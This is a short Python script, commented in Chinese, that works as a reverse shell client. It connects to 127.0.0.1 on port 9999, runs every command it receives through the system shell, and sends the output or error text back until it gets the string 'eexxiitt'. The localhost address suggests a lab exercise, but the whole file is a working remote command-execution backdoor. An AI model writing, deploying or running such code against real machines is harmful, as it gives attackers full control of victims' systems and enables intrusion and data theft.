import subprocess
from socket import socket

serv = socket()
serv.connect(('127.0.0.1', 9999))

while True:
    command = serv.recv(1024).decode('utf-8')
    if not command:
        break  # Exit if the command is empty
    if command == 'eexxiitt':  # 退出，中断连接
        serv.send('断开连接'.encode('utf-8'))
        break

    print(f"接收到命令: '{command}'")
    
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check for errors and decode stdout and stderr properly
    stderr_decoded = result.stderr.decode('utf-8', errors='ignore')
    stdout_decoded = result.stdout.decode('utf-8', errors='ignore')

    if stderr_decoded:
        try:
            serv.send(f'[#] 命令执行失败: {stderr_decoded}'.encode('utf-8'))
        except BrokenPipeError:
            print("连接已断开")
            break
        continue

    try:
        serv.send(f'[+] 命令执行成功\n{stdout_decoded}'.encode('utf-8'))
    except BrokenPipeError:
        print("连接已断开")
        break

serv.close()
